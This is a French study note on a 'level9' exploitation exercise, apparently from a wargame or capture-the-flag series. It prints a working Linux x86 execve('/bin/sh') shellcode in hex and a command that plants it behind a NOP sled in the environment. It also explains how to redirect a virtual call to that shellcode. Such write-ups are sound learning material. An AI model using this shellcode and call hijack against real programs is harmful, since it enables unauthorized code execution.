# Shellcode (level9)

**Voir aussi :** `shellcode_pas_a_pas.md` (explication instruction par instruction), `concepts.md` (chaîne d’exploit, NOP sled, layout).

## Référence utilisée

Shellcode **Linux x86 execve("/bin/sh") — 28 bytes**  
- **Auteur :** Jean Pascal Pereira \<pereira@secbiz.de\>  
- **Source :** [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html)  
- **Web :** http://0xffe4.org  

Octets utilisés :
```c
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
Aucune chaîne "/bin/sh" à concaténer : le shellcode construit "/bin//sh" sur la pile (push).

## Concept
Un **shellcode** est du code machine injecté (souvent execve("/bin/sh")). Comme le binaire level9 n’a pas `system` ni "/bin/sh", on exécute du code externe.

## Où ça apparaît (level9)
- L’appel virtuel saute vers *(second->vptr) = *(premier+4). On met à **premier+4** l’adresse du shellcode (4 premiers octets du payload).
- Le shellcode est dans **env** : `env -i payload=$(python -c 'print "\x90"*1000 + "<shellcode>"')`.
- Nopsled (1000×\x90) pour faciliter l’atteinte ; l’adresse (ex. 0xbffffc63) se trouve en GDB avec `x/200s environ`.

## Flux

```
  call edx   (edx = *(premier+4) = adresse shellcode)
      ↓
  nopsled → shellcode execve("/bin/sh")
      ↓
  shell
```

## Résumé mental
Pas de gadget “system” dans le binaire → on injecte du code (shellcode) dans l’env et on détourne l’appel virtuel vers cette adresse.

## Références
- Shellcode 811 : https://shell-storm.org/shellcode/files/shellcode-811.html  
- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html
